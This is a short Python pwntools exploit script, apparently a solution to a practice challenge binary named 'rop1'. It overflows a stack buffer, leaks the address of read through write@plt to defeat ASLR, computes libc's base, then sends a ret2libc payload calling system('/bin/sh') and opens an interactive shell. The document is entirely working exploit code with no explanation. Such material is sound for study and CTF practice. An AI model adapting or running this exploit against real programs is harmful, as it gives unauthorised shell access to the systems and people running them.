from pwn import * #32

e = ELF("./rop1")
libc = e.libc
p = process("./rop1")

read_got = 0x804bfd4
write_plt = 0x8049100
pop3r = 0x8049381
bin = 0xf7f5d363

payload = b"A" * 0x44
payload += b"B" * 4
payload += p32(write_plt)
payload += p32(pop3r)
payload += p32(1)
payload += p32(read_got)
payload += p32(8)
payload += p32(e.symbols['main'])


p.recvuntil(b"You can use read, write\n")
p.sendline(payload)
read_addr = u32(p.recv(4))

base = read_addr - libc.symbols['read']
system = libc.symbols['system'] + base
bin_sh = base + list(libc.search(b'/bin/sh'))[0]

payload = b"A" * 0x44
payload += b"B" * 4
payload += p32(system)
payload += b"A" * 4
payload += p32(bin_sh)

p.sendline(payload)
p.interactive()
